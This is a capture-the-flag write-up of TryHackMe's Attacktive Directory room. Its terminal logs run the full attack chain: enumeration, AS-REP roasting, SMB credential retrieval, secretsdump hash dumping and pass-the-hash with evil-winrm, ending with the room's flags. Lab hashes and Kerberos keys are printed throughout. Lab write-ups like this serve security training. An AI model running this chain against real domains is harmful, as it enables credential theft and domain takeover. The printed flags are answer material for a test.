# attacktivedirectory

Level: medium

https://tryhackme.com/room/attacktivedirectory

## nmap 

```
sugo@kali:~/Documents/thm/attacktivedirectory$ nmap -T4 -p- 10.10.25.251
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-26 16:23 CEST
Nmap scan report for 10.10.25.251
Host is up (0.056s latency).
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49669/tcp open  unknown
49672/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49679/tcp open  unknown
49684/tcp open  unknown
49696/tcp open  unknown
49806/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 75.24 seconds
```

## Null Session?

```
sugo@kali:~/Documents/thm/attacktivedirectory$ rpcclient -U '' -N 10.10.185.182
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydominfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $>
```

No :)

## enum4linux

```
sugo@kali:~/Documents/thm/attacktivedirectory$ enum4linux 10.10.185.182
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jul 26 08:37:52 2022

 =========================================( Target Information )=========================================

Target ........... 10.10.185.182
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.185.182 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.10.185.182 )===============================

Looking up status of 10.10.185.182
No reply from 10.10.185.182

 ===================================( Session Check on 10.10.185.182 )===================================


[+] Server 10.10.185.182 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.185.182 )================================

Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)


 ==================================( OS information on 10.10.185.182 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.185.182 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.10.185.182 )=======================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 =================================( Share Enumeration on 10.10.185.182 )=================================

do_connect: Connection to 10.10.185.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.185.182


 ===========================( Password Policy Information for 10.10.185.182 )===========================


[E] Unexpected error from polenum:



[+] Attaching to 10.10.185.182 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.185.182)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient



 ======================================( Groups on 10.10.185.182 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.10.185.182 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID:
S-1-5-21-3591857110-2884097990-301047963

[I] Found new SID:
S-1-5-21-3591857110-2884097990-301047963

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''

S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''

S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)



 ===============================( Getting printer info for 10.10.185.182 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Tue Jul 26 08:43:35 2022
```

So far, we got domain name: `THM-AD.LOCAL`

## Kerbrute

Installing tool:

```
git clone https://github.com/ropnop/kerbrute.git
sugo@kali:/opt/tools/kerbrute$ export PATH=$PATH:/usr/local/go/bin
sugo@kali:/opt/tools/kerbrute$ make linux
Building for linux amd64...
go: downloading github.com/ropnop/gokrb5/v8 v8.0.0-20201111231119-729746023c02
go: downloading github.com/spf13/cobra v1.1.1
go: downloading github.com/op/go-logging v0.0.0-20160315200505-970db520ece7
go: downloading github.com/spf13/pflag v1.0.5
go: downloading github.com/jcmturner/dnsutils/v2 v2.0.0
go: downloading github.com/jcmturner/gofork v1.0.0
go: downloading github.com/hashicorp/go-uuid v1.0.2
go: downloading github.com/jcmturner/aescts/v2 v2.0.0
go: downloading golang.org/x/crypto v0.0.0-20201016220609-9e8e0b390897
go: downloading github.com/jcmturner/rpc/v2 v2.0.2
go: downloading golang.org/x/net v0.0.0-20200114155413-6afb5195e5aa
Building for linux 386...
Done.
```

## Users enum

```
sugo@kali:~/Documents/thm/attacktivedirectory$ /opt/tools/kerbrute/dist/kerbrute_linux_amd64 userenum userlist.txt --dc 10.10.185.182 -d thm-ad

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 07/26/22 - Ronnie Flathers @ropnop

2022/07/26 08:57:47 >  Using KDC(s):
2022/07/26 08:57:47 >   10.10.185.182:88

2022/07/26 08:57:47 >  [+] VALID USERNAME:       james@thm-ad
2022/07/26 08:57:48 >  [+] svc-admin has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:08eef9abf2f1731b9e6e9d58ff178804$0dd9b916ee2077aa482804d1741f0dcf0391735ad056c50e574fba446f4995cb0965da2acf7bc76125044fbe9da252e480f129c5253ed7e950e7a055f47073c83e5bbaf4ab221e544055a5085d37d611d56b35713f95053fc99e267119f4b81fa20cce3f4dc808f0b2f2d342eb693ad2aec9c4c915e40c0551dd2ba3efa6bfa44688c9a4682b735f35b15ac6b85a4ba8487313e19ba6f907f034287120265775abf6fe493e2b86372bb7244150fe3018274c1b1f7f65c66d3893c78bdb4d1dbd3fd43e47c9dce740c141b51524a33c3fe230c68489c18b7b87f380c4eb8ee9718a90bf164fa66506fe1f86e2298bf7869249e1cbf5fc8093f34bca17b6
2022/07/26 08:57:48 >  [+] VALID USERNAME:       svc-admin@thm-ad
2022/07/26 08:57:50 >  [+] VALID USERNAME:       James@thm-ad
2022/07/26 08:57:50 >  [+] VALID USERNAME:       robin@thm-ad
2022/07/26 08:57:56 >  [+] VALID USERNAME:       darkstar@thm-ad
2022/07/26 08:57:59 >  [+] VALID USERNAME:       administrator@thm-ad
2022/07/26 08:58:06 >  [+] VALID USERNAME:       backup@thm-ad
2022/07/26 08:58:10 >  [+] VALID USERNAME:       paradox@thm-ad
2022/07/26 08:58:30 >  [+] VALID USERNAME:       JAMES@thm-ad
2022/07/26 08:58:37 >  [+] VALID USERNAME:       Robin@thm-ad
2022/07/26 08:59:20 >  [+] VALID USERNAME:       Administrator@thm-ad


2022/07/26 09:00:46 >  [+] VALID USERNAME:       Darkstar@thm-ad
2022/07/26 09:01:13 >  [+] VALID USERNAME:       Paradox@thm-ad
..
```	

## ASRepRoasting

```
sugo@kali:/opt/tools/impacket/examples$ python3 ./GetNPUsers.py  thm-ad/ -usersfile /home/sugo/Documents/thm/attacktivedirectory/valid_user_kerbrute -dc-ip 10.10.185.182
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@THM-AD:88ba90e9f2214fada63daff249c18e86$c5dbfa8d45094341e9a4637ac4aadb893e7ab833b6717c79f371fac54e4927f4d1631ee6c5afadea43a474372432ea547fa7d9b8f3f0bb4591c1433b3923f191e677814701e651f34ba3047b4ddd8c49258916eb974065cd730463d3965fb8b5a12116993c64fb2a0156456c623d0eeba170fd501214fe6792d227501a883faf7f764717781d86657b2f143f91229e969de37b2071b03c9fbf646a0fba244304411bcc82be0227be51966d1dc4f3e2730e842aca791bd8a4e9a1132a72d3b8f619b22b3672efcaf2d0fde19ab1d3ffddeda08e4926db301361556d240d2c0c20ba661536da13887357
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## Listing shares

```
sugo@kali:~/Documents/thm/attacktivedirectory$ smbclient -L \\\\10.10.25.251\\ -U THM-AD\\svc-admin
Password for [THM-AD\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.25.251 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## Got file

```
sugo@kali:~/Documents/thm/attacktivedirectory$ smbclient \\\\10.10.25.251\\backup -U THM-AD\\svc-admin
Password for [THM-AD\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

                8247551 blocks of size 4096. 3564995 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
sugo@kali:~/Documents/thm/attacktivedirectory$ cat backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

## Decoded string

```
sugo@kali:~/Documents/thm/attacktivedirectory$ echo -n "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" |base64 -d
backup@spookysec.local:backup2517860
```

## Run secretsdump

```
sugo@kali:~/Documents/thm/attacktivedirectory$ secretsdump.py -debug spookysec.local/backup:backup2517860@10.10.25.251
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python2.7/dist-packages/impacket
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Session resume file will be sessionresume_gSDfrsTL
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-500
[+] Calling DRSGetNCChanges for {d34f1ef6-64a7-4c8b-94a3-f568d91b390f}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=spookysec,DC=local
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-501
[+] Calling DRSGetNCChanges for {8c844443-775d-4d76-b8dd-484cf10db617}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Guest,CN=Users,DC=spookysec,DC=local
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-502
[+] Calling DRSGetNCChanges for {2040ce37-11c7-4433-87ab-a712a8d0dfb7}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=spookysec,DC=local
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1103
[+] Calling DRSGetNCChanges for {e6f6420b-6760-44b2-aa8f-0a07839b6205}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Ben Skidy,OU=Staff,DC=spookysec,DC=local
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1104
[+] Calling DRSGetNCChanges for {908915a4-ab78-468b-83f6-a91afb74c317}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Ashu BreakerOfThings,OU=Staff,DC=spookysec,DC=local
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1105
[+] Calling DRSGetNCChanges for {7acdd757-ce5a-4ceb-9a9f-c82e70f964d1}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=James Ninja,OU=Staff,DC=spookysec,DC=local
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1106
[+] Calling DRSGetNCChanges for {e43491a1-07e2-4854-97c0-8c583c128293}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=root optional,OU=Staff,DC=spookysec,DC=local
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1107
[+] Calling DRSGetNCChanges for {33062557-3737-439c-b3e9-0fe084a85185}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Dan SherlockSec,OU=Staff,DC=spookysec,DC=local
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1108
[+] Calling DRSGetNCChanges for {8f2e5f80-bafe-43ff-bd96-71032ec353cc}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Jon Darkstar,OU=Staff,DC=spookysec,DC=local
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1109
[+] Calling DRSGetNCChanges for {a2d8c962-1b9e-42bb-8566-2cd53e27513b}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Ori,OU=Staff,DC=spookysec,DC=local
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1110
[+] Calling DRSGetNCChanges for {6baf6e7c-f036-47c9-a540-dfa8c85f859b}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Robin,OU=Staff,DC=spookysec,DC=local
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1111
[+] Calling DRSGetNCChanges for {db714d30-f002-471f-b4dd-12951c71019d}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Par Adox,OU=Staff,DC=spookysec,DC=local
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1112
[+] Calling DRSGetNCChanges for {fa4d0281-9bcd-4c45-905d-3c33f732d61b}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Muirland Oracle,OU=Staff,DC=spookysec,DC=local
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1113
[+] Calling DRSGetNCChanges for {8b6b3421-630c-4a2c-bf2b-4e7a802ae2c4}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=horshark,OU=Staff,DC=spookysec,DC=local
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1114
[+] Calling DRSGetNCChanges for {d2fe7d1f-cb38-43db-a905-984b1bc99c23}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=svc admin,OU=Staff,DC=spookysec,DC=local
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1118
[+] Calling DRSGetNCChanges for {92e326a7-1a92-43f9-aa2b-9aa51ba955e6}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=backup,OU=Administrator,DC=spookysec,DC=local
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1601
[+] Calling DRSGetNCChanges for {7fea576d-68aa-4ccb-b09a-264580589bd7}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Admin Spooks,OU=Administrator,DC=spookysec,DC=local
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-3591857110-2884097990-301047963-1000
[+] Calling DRSGetNCChanges for {57ee0846-b255-42bb-84d3-ba32b266e1e5}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=ATTACKTIVEDIREC,OU=Domain Controllers,DC=spookysec,DC=local
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:9d0fa5731f17ba963cf5576bb110b980:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:1e176475c1a865c4f549010dd2521a8f476a6d8e5cb7aa689d33d57110500f7a
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:bd1b2a368e04ddeedf7b4def2fb57630
ATTACKTIVEDIREC$:des-cbc-md5:299e8fa4b591e50b
[*] Cleaning up...
```

## Got shell

```
sugo@kali:~/Documents/thm/attacktivedirectory$ evil-winrm -i 10.10.25.251 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint


[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents>

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\administrator\desktop> whoami
thm-ad\administrator
```

## Flags

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\svc-admin\Desktop> type user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\backup\desktop> type PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\administrator\desktop> type root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
```


	
